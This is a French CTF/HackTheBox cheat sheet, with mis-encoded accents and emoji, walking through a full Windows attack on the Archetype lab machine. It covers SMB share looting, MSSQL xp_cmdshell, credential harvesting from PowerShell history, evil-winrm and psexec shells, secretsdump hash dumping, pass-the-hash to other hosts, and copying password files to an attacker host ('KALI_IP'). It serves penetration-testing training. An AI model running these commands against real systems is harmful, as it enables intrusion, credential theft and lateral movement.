# ğŸ¯ Workflow Typique HTB/CTF - Windows

[â† Retour aux cheatsheets](README.md) | [â† Retour Ã  la table des matiÃ¨res](../README.md)

Ce guide prÃ©sente un **workflow d'attaque complet** pour les machines Windows dans HackTheBox et autres CTF, du scan initial Ã  l'obtention du flag root.

---

## ğŸ“‹ Table des MatiÃ¨res
- [Workflow Standard](#-workflow-standard)
- [ScÃ©nario Concret - HTB Archetype](#-scÃ©nario-concret---htb-archetype)
- [Choix des Outils selon les Ports](#-choix-des-outils-selon-les-ports)
- [Points de DÃ©cision ClÃ©s](#-points-de-dÃ©cision-clÃ©s)
- [Commandes Essentielles](#-commandes-essentielles)

---

## ğŸ”„ Workflow Standard

```
1ï¸âƒ£ RECONNAISSANCE & Ã‰NUMÃ‰RATION
   â””â”€> nmap -sC -sV -p- TARGET_IP
       â””â”€> Identifier les services (SMB, MSSQL, WinRM, RDP, HTTP)

2ï¸âƒ£ ACCÃˆS INITIAL (obtenir premiers credentials)
   â”œâ”€> Web : SQLi, LFI, RCE, fichiers de config exposÃ©s
   â”œâ”€> SMB : Partages nullsession, anonymous login
   â”œâ”€> FTP : Anonymous login, fichiers de config
   â”œâ”€> MSSQL : Default credentials (sa:sa, sa:password)
   â””â”€> Autres : VulnÃ©rabilitÃ©s publiques (searchsploit)

3ï¸âƒ£ EXPLOITATION (utiliser les credentials)
   â”œâ”€> MSSQL (1433) â†’ impacket-mssqlclient â†’ xp_cmdshell
   â”œâ”€> WinRM (5985) â†’ evil-winrm
   â”œâ”€> SMB (445)    â†’ impacket-psexec / smbclient
   â””â”€> RDP (3389)   â†’ xfreerdp

4ï¸âƒ£ Ã‰NUMÃ‰RATION LOCALE (chercher escalade)
   â”œâ”€> PowerShell history (â­ trÃ¨s frÃ©quent dans HTB!)
   â”œâ”€> Fichiers de config (web.config, .env, etc.)
   â”œâ”€> Credentials en clair dans fichiers/registre
   â”œâ”€> WinPEAS pour Ã©numÃ©ration automatique
   â””â”€> Permissions mal configurÃ©es

5ï¸âƒ£ ESCALADE DE PRIVILÃˆGES
   â”œâ”€> Credentials trouvÃ©s â†’ Connexion avec compte admin
   â”œâ”€> Pass-the-Hash avec hashes dumpÃ©s
   â””â”€> Exploitation de vulnÃ©rabilitÃ©s (SeImpersonate, etc.)

6ï¸âƒ£ POST-EXPLOITATION
   â”œâ”€> Dump des hashes (impacket-secretsdump)
   â”œâ”€> RÃ©cupÃ©ration des flags (user.txt, root.txt)
   â””â”€> Pivoting vers autres machines si rÃ©seau
```

---

## ğŸ® ScÃ©nario Concret - HTB Archetype

### Ã‰tape 1 : Ã‰numÃ©ration initiale
```bash
# Scan complet des ports
nmap -sC -sV -p- 10.129.95.187

# RÃ©sultats typiques :
# 445/tcp   open  microsoft-ds      # SMB
# 1433/tcp  open  ms-sql-s          # MSSQL
# 5985/tcp  open  wsman             # WinRM
```

### Ã‰tape 2 : Ã‰numÃ©ration SMB (recherche de fichiers)
```bash
# Lister les partages SMB sans authentification
smbclient -L //10.129.95.187 -N

# RÃ©sultat : Partage "backups" accessible
# Connexion au partage
smbclient //10.129.95.187/backups -N

# TÃ©lÃ©charger fichier de config trouvÃ©
smb: \> get prod.dtsConfig
smb: \> exit

# Analyser le fichier
cat prod.dtsConfig
# RÃ©sultat : Credentials MSSQL trouvÃ©s!
# User ID=ARCHETYPE\sql_svc;Password=M3g4c0rp123;
```

### Ã‰tape 3 : Exploitation MSSQL
```bash
# Connexion MSSQL avec credentials trouvÃ©s
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

# VÃ©rification des privilÃ¨ges
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
# â†’ 1 (on est sysadmin, parfait!)

# Activation de xp_cmdshell
SQL> ENABLE_xp_cmdshell

# Test d'exÃ©cution de commandes
SQL> xp_cmdshell "whoami"
# â†’ archetype\sql_svc

# RÃ©cupÃ©ration du flag utilisateur
SQL> xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"
# â†’ 3e7b102e78218e935bf3f4951fec21a3
```

### Ã‰tape 4 : Ã‰numÃ©ration pour escalade de privilÃ¨ges
```bash
# â­ Recherche dans PowerShell history (TRÃˆS COURANT dans HTB!)
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# RÃ©sultat :
# net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
# â†’ Password administrateur trouvÃ© : MEGACORP_4dm1n!!

# Autres emplacements intÃ©ressants :
SQL> xp_cmdshell "dir C:\Users\sql_svc\Desktop"
SQL> xp_cmdshell "type C:\Users\sql_svc\Documents\passwords.txt"
SQL> xp_cmdshell "dir C:\ /s /b | findstr password"
```

### Ã‰tape 5 : Escalade de privilÃ¨ges - Obtenir shell admin

**Option A : Evil-WinRM (port 5985 ouvert) â­ RecommandÃ©**
```bash
# Shell PowerShell complet avec le password trouvÃ©
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'

# Navigation et rÃ©cupÃ©ration du flag
*Evil-WinRM* PS C:\> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\> dir
*Evil-WinRM* PS C:\> type root.txt
# â†’ b91ccec3305e98240082d4474b848528
```

**Option B : PSExec (port 445 ouvert)**
```bash
# Shell CMD via SMB
impacket-psexec administrator:MEGACORP_4dm1n!!@10.129.95.187

# Navigation
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir
C:\Users\Administrator\Desktop> type root.txt
```

**Option C : Pass-the-Hash (si on a dumpÃ© des hashes)**
```bash
# Dump des hashes depuis le shell admin
impacket-secretsdump administrator:MEGACORP_4dm1n!!@10.129.95.187

# RÃ©sultat :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
#                                                      â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘
#                                                      NT Hash

# Connexion avec le hash (sans mot de passe)
evil-winrm -i 10.129.95.187 -u administrator -H 'e19ccf75ee54e06b06a5907af13cef42'
```

### Ã‰tape 6 : Post-exploitation (optionnel)
```bash
# Dump complet des credentials
impacket-secretsdump administrator:MEGACORP_4dm1n!!@10.129.95.187

# Ã‰numÃ©ration rÃ©seau pour pivoting
*Evil-WinRM* PS C:\> ipconfig
*Evil-WinRM* PS C:\> arp -a
*Evil-WinRM* PS C:\> route print

# Upload de WinPEAS pour Ã©numÃ©ration avancÃ©e
*Evil-WinRM* PS C:\> upload /opt/tools/winPEAS.exe C:\Temp\winPEAS.exe
*Evil-WinRM* PS C:\> C:\Temp\winPEAS.exe
```

---

## ğŸ”Œ Choix des Outils selon les Ports

```bash
# 1ï¸âƒ£ Scan de ports
nmap -p 445,1433,5985,5986,3389,135 TARGET_IP

# 2ï¸âƒ£ DÃ©cision selon rÃ©sultats :
```

| Port Ouvert | Service | Outil pour Shell | Commande |
|-------------|---------|------------------|----------|
| **1433** | MSSQL | impacket-mssqlclient | `impacket-mssqlclient user:pass@IP -windows-auth` |
| **5985** | WinRM | evil-winrm â­ | `evil-winrm -i IP -u user -p 'pass'` |
| **445** | SMB | impacket-psexec | `impacket-psexec user:pass@IP` |
| **135** | WMI | impacket-wmiexec | `impacket-wmiexec user:pass@IP` |
| **3389** | RDP | xfreerdp | `xfreerdp /u:user /p:pass /v:IP` |

### Workflow de dÃ©cision

```
Port MSSQL (1433) ouvert
    â†“
impacket-mssqlclient â†’ xp_cmdshell
    â†“
Chercher credentials admin dans PowerShell history
    â†“
Port WinRM (5985) ouvert ? â”€â”€YESâ”€â”€> evil-winrm (â­ meilleur shell)
    â†“ NO
Port SMB (445) ouvert ? â”€â”€YESâ”€â”€> impacket-psexec
    â†“ NO
Port WMI (135) ouvert ? â”€â”€YESâ”€â”€> impacket-wmiexec
```

---

## ğŸ² Points de DÃ©cision ClÃ©s

### 1. Recherche de Credentials Initiaux

```bash
# Web enumeration
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
# â†’ Chercher : config.php, web.config, .env, backup files

# SMB enumeration
smbclient -L //TARGET_IP -N
smbmap -H TARGET_IP -u guest
# â†’ Chercher : Partages accessibles, fichiers de config

# FTP anonymous
ftp TARGET_IP
# Username: anonymous
# Password: anonymous
# â†’ Chercher : Fichiers de backup, config files

# MSSQL default credentials
impacket-mssqlclient sa:@TARGET_IP
impacket-mssqlclient sa:password@TARGET_IP
impacket-mssqlclient sa:sa@TARGET_IP
```

### 2. Escalade aprÃ¨s AccÃ¨s Initial

```bash
# â­ PowerShell History (TRÃˆS FRÃ‰QUENT dans HTB!)
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Fichiers de config web
type C:\inetpub\wwwroot\web.config
type C:\xampp\htdocs\config.php

# Credentials stockÃ©s
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Recherche de fichiers sensibles
dir C:\ /s /b | findstr /i password
dir C:\ /s /b | findstr /i config
dir C:\ /s /b | findstr /i .kdbx  # KeePass databases

# Upload de WinPEAS pour Ã©numÃ©ration automatique
# Via evil-winrm : upload winPEAS.exe
# Via SMB : copy \\KALI_IP\share\winPEAS.exe C:\Temp\
```

### 3. Evil-WinRM vs Impacket PSExec

```
CritÃ¨re de choix :

âœ… Evil-WinRM si :
   - Port 5985/5986 (WinRM) ouvert
   - Tu veux un shell PowerShell natif
   - Upload/Download de fichiers frÃ©quents
   - Meilleure expÃ©rience interactive

âœ… Impacket PSExec si :
   - Port 445 (SMB) ouvert
   - WinRM dÃ©sactivÃ©/bloquÃ©
   - Environnement legacy
   - Tu as besoin d'autres outils Impacket (secretsdump, etc.)

ğŸ’¡ Astuce : Les deux supportent Pass-the-Hash !
```

---

## ğŸ’¡ Commandes Essentielles

### Ã‰numÃ©ration
```bash
# Nmap complet
nmap -sC -sV -p- TARGET_IP -oA scan

# SMB enumeration
smbclient -L //TARGET_IP -N
smbmap -H TARGET_IP -u guest
enum4linux -a TARGET_IP

# Web enumeration
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
nikto -h http://TARGET_IP
```

### Exploitation MSSQL
```bash
# Connexion
impacket-mssqlclient DOMAIN/user:password@IP -windows-auth

# Commandes SQL
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
SQL> ENABLE_xp_cmdshell
SQL> xp_cmdshell "whoami"
SQL> xp_cmdshell "type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

### Shells Windows
```bash
# Evil-WinRM (PowerShell)
evil-winrm -i IP -u user -p 'pass'
evil-winrm -i IP -u user -H NTHASH

# PSExec (CMD)
impacket-psexec user:pass@IP
impacket-psexec user@IP -hashes :NTHASH

# WMIExec (Semi-interactif, discret)
impacket-wmiexec user:pass@IP
```

### Dump de Credentials
```bash
# Dump SAM/LSA/NTDS
impacket-secretsdump user:pass@IP
impacket-secretsdump user@IP -hashes :NTHASH

# RÃ©sultat :
# Administrator:500:aad3b...:e19ccf75ee54e06b06a5907af13cef42:::
#                              â†‘â†‘â†‘â†‘â†‘â†‘â†‘ NT Hash pour PTH
```

### Transfert de Fichiers
```bash
# MÃ©thode 1 : Serveur SMB sur Kali (â­ RECOMMANDÃ‰)
impacket-smbserver share $(pwd) -smb2support

# Avec authentification (Windows 10/11 rÃ©cent)
impacket-smbserver share $(pwd) -smb2support -username kali -password kali

# Depuis Windows :
net use \\KALI_IP\share /user:kali kali
copy \\KALI_IP\share\nc.exe C:\Temp\nc.exe
copy C:\Users\Admin\passwords.txt \\KALI_IP\share\

# MÃ©thode 2 : Via Evil-WinRM (si WinRM disponible)
*Evil-WinRM* PS C:\> upload /local/file.exe C:\Temp\file.exe
*Evil-WinRM* PS C:\> download C:\Temp\passwords.txt /local/path/

# MÃ©thode 3 : Via HTTP (alternative)
# Sur Kali :
python3 -m http.server 80
# Sur Windows :
certutil -urlcache -f http://KALI_IP/nc.exe C:\Temp\nc.exe
powershell -c "iwr -uri http://KALI_IP/nc.exe -outfile C:\Temp\nc.exe"
```

---

## ğŸ¯ WORKFLOW COMPLET TYPE (RÃ©sumÃ© DÃ©taillÃ©)

### ScÃ©nario Standard : MSSQL â†’ Shell Admin

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1ï¸âƒ£ Ã‰NUMÃ‰RATION INITIALE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
nmap -sC -sV -p- TARGET_IP
# RÃ©sultat typique : 445 (SMB), 1433 (MSSQL), 5985 (WinRM)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2ï¸âƒ£ Ã‰NUMÃ‰RATION SMB (recherche credentials)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
smbclient -L //TARGET_IP -N
smbclient //TARGET_IP/backups -N
smb: \> ls
smb: \> get config.dtsConfig
smb: \> exit

cat config.dtsConfig
# Analyse â†’ Credentials MSSQL trouvÃ©s : sql_svc:M3g4c0rp123 âœ…

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 3ï¸âƒ£ EXPLOITATION MSSQL
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
impacket-mssqlclient DOMAIN/sql_svc:M3g4c0rp123@TARGET_IP -windows-auth

# VÃ©rifier privilÃ¨ges
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
# â†’ 1 (sysadmin âœ“)

# Activer xp_cmdshell
SQL> ENABLE_xp_cmdshell

# Test
SQL> xp_cmdshell "whoami"
# â†’ domain\sql_svc

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 4ï¸âƒ£ FLAG USER
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
SQL> xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"
# â†’ 3e7b102e78218e935bf3f4951fec21a3 âœ…

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 5ï¸âƒ£ ESCALADE DE PRIVILÃˆGES (â­ PowerShell History)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# RÃ©sultat typique HTB/CTF :
# net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
# â†’ Password admin trouvÃ© : MEGACORP_4dm1n!! âœ…âœ…âœ…

# Autres emplacements Ã  vÃ©rifier si history vide :
SQL> xp_cmdshell "type C:\inetpub\wwwroot\web.config"
SQL> xp_cmdshell "dir C:\ /s /b | findstr /i password"

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 6ï¸âƒ£ SHELL ADMIN - Option A : Evil-WinRM (â­ PRÃ‰FÃ‰RÃ‰)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Si port 5985 ouvert (vÃ©rifier avec nmap)
evil-winrm -i TARGET_IP -u administrator -p 'MEGACORP_4dm1n!!'

*Evil-WinRM* PS C:\> whoami
# â†’ archetype\administrator âœ…

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 6ï¸âƒ£ SHELL ADMIN - Option B : PSExec
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Si port 445 ouvert mais pas 5985
impacket-psexec administrator:MEGACORP_4dm1n!!@TARGET_IP

C:\Windows\system32> whoami
# â†’ nt authority\system âœ…

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 7ï¸âƒ£ FLAG ROOT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Via Evil-WinRM :
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt

# Via PSExec :
C:\> type C:\Users\Administrator\Desktop\root.txt
# â†’ b91ccec3305e98240082d4474b848528 âœ…

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 8ï¸âƒ£ (OPTIONNEL) DUMP CREDENTIALS pour mouvement latÃ©ral
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
impacket-secretsdump administrator:MEGACORP_4dm1n!!@TARGET_IP

# RÃ©sultat :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
#                                                      â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘
#                                                      NT Hash pour Pass-the-Hash

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 9ï¸âƒ£ (OPTIONNEL) PASS-THE-HASH vers autres machines
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Vers une autre machine du rÃ©seau
evil-winrm -i OTHER_IP -u administrator -H e19ccf75ee54e06b06a5907af13cef42
# OU
impacket-psexec administrator@OTHER_IP -hashes :e19ccf75ee54e06b06a5907af13cef42
```

---

## ğŸ“ Points ClÃ©s Ã  Retenir (MÃ©mo Rapide)

### â­â­â­ LE PLUS IMPORTANT dans HTB/CTF

**PowerShell History = GOLD !**
```bash
# Ã€ TOUJOURS vÃ©rifier en premier aprÃ¨s accÃ¨s initial
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Depuis MSSQL xp_cmdshell :
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Pourquoi ?**
- Contient TOUTES les commandes PowerShell tapÃ©es par l'utilisateur
- Souvent contient des passwords en clair (net use, credentials, etc.)
- â­ **90% des machines HTB Easy/Medium** ont le password admin ici
- Ã‰quivalent du `.bash_history` Linux mais moins connu

### ğŸ”‘ Emplacements de Credentials Courants

**Ordre de prioritÃ© Ã  vÃ©rifier :**
```bash
# 1. PowerShell History (â­â­â­ LE PLUS IMPORTANT)
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 2. Fichiers de config web (â­â­)
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\wamp\www\config.inc.php

# 3. Registry - Auto-logon (â­)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# 4. Fichiers de backup/config
dir C:\ /s /b | findstr /i backup
dir C:\ /s /b | findstr /i config
dir C:\ /s /b | findstr /i password
dir C:\ /s /b | findstr /i .kdbx

# 5. Credentials stockÃ©s Windows
cmdkey /list
```

### ğŸ¯ Ordre de PrÃ©fÃ©rence pour les Shells

```
1. Evil-WinRM (port 5985) â­â­â­
   â†’ Meilleur shell PowerShell interactif
   â†’ Upload/Download natif
   â†’ Environnement moderne

2. PSExec (port 445) â­â­
   â†’ Shell CMD classique
   â†’ TrÃ¨s fiable et stable
   â†’ Fonctionne partout

3. WMIExec (port 135) â­
   â†’ Plus discret (pas de service)
   â†’ Bon pour EDR/AV actifs
   â†’ Semi-interactif
```

### ğŸ”„ Ordre de PrÃ©fÃ©rence pour Transferts de Fichiers

```
1. SMB (impacket-smbserver) â­â­â­
   â†’ Bidirectionnel (upload + download)
   â†’ Copy/paste simple
   â†’ Stable pour gros fichiers

2. Evil-WinRM upload/download â­â­
   â†’ TrÃ¨s simple d'utilisation
   â†’ Natif dans l'outil
   â†’ Requiert WinRM actif

3. HTTP (python3 -m http.server) â­
   â†’ Unidirectionnel (download only)
   â†’ Plus dÃ©tectÃ© par AV
   â†’ NÃ©cessite certutil/wget/curl
```

# Via Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/file.exe C:\Temp\file.exe
*Evil-WinRM* PS C:\> download C:\Temp\passwords.txt /local/path/
```

---

## ğŸ”— Liens vers Guides DÃ©taillÃ©s

### Ã‰numÃ©ration
- [MSSQL Enumeration](../03-enumeration/mssql.md) - Guide complet MSSQL
- [SMB Enumeration](../03-enumeration/smb-samba.md) - Ã‰numÃ©ration SMB/Samba
- [WinRM Enumeration](../03-enumeration/winrm.md) - Ã‰numÃ©ration WinRM

### Outils
- [Impacket](../06-tools/impacket.md) - Suite complÃ¨te Impacket
- [Evil-WinRM](../06-tools/evil-winrm.md) - Guide Evil-WinRM dÃ©taillÃ©
- [CrackMapExec](../06-tools/crackmapexec.md) - Spray de credentials

### Post-exploitation
- [Windows PrivEsc](../05-post-exploitation/windows-privesc.md) - Escalade de privilÃ¨ges Windows
- [Pivoting](../09-pivoting/) - Mouvement latÃ©ral

### Payloads
- [Reverse Shells](../08-payloads/reverse-shells.md) - Shells Ã  exÃ©cuter via xp_cmdshell

---

## ğŸ¯ Checklist Rapide

```
â˜ 1. Scan nmap complet (-p-)
â˜ 2. Ã‰numÃ©ration services trouvÃ©s (SMB, HTTP, MSSQL, etc.)
â˜ 3. Recherche credentials initiaux (web, SMB, FTP, defaults)
â˜ 4. Connexion avec credentials (mssqlclient, evil-winrm, psexec)
â˜ 5. Flag user (C:\Users\<user>\Desktop\user.txt)
â˜ 6. Ã‰numÃ©ration locale (PowerShell history â­, config files)
â˜ 7. Credentials admin trouvÃ©s
â˜ 8. Shell admin (evil-winrm ou psexec)
â˜ 9. Flag root (C:\Users\Administrator\Desktop\root.txt)
â˜ 10. (Optionnel) Dump credentials (secretsdump) pour pivoting
```

---

## ğŸ’¡ Astuces HTB/CTF

### 1. PowerShell History = GOLD
```bash
# C'est le fichier le plus important Ã  vÃ©rifier!
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# TrÃ¨s souvent contient :
# - Passwords en clair
# - Commandes de connexion avec credentials
# - net use avec mot de passe admin
```

### 2. xp_cmdshell depuis MSSQL
```sql
-- Toujours vÃ©rifier si tu es sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Si 1 (oui), tu peux activer xp_cmdshell
ENABLE_xp_cmdshell

-- Et exÃ©cuter n'importe quelle commande Windows
xp_cmdshell "commande_ici"
```

### 3. Evil-WinRM > PSExec
```bash
# Evil-WinRM offre :
# - Shell PowerShell complet
# - Upload/Download intÃ©grÃ©
# - Meilleure expÃ©rience utilisateur

# Utilise PSExec seulement si WinRM n'est pas disponible
```

### 4. Pass-the-Hash fonctionne partout
```bash
# Tu n'as pas besoin de cracker les hashes!
# Utilise directement le NT Hash :

evil-winrm -i IP -u administrator -H 'NT_HASH'
impacket-psexec administrator@IP -hashes :NT_HASH
impacket-wmiexec administrator@IP -hashes :NT_HASH
```

---

## ğŸ“š Ressources

- **HackTheBox Machines Windows Faciles :**
  - Archetype (â­ parfait pour dÃ©buter)
  - Sequel (MSSQL basique)
  - Explosion (RDP, Ã©numÃ©ration basique)
  - Blue (EternalBlue, facile)

- **Outils Ã  maÃ®triser :**
  - Impacket (essentiel)
  - Evil-WinRM (trÃ¨s pratique)
  - nmap (toujours)
  - CrackMapExec (spray de creds)

---

**ğŸ“ Bonne chance pour tes CTF/HTB ! ğŸš€**
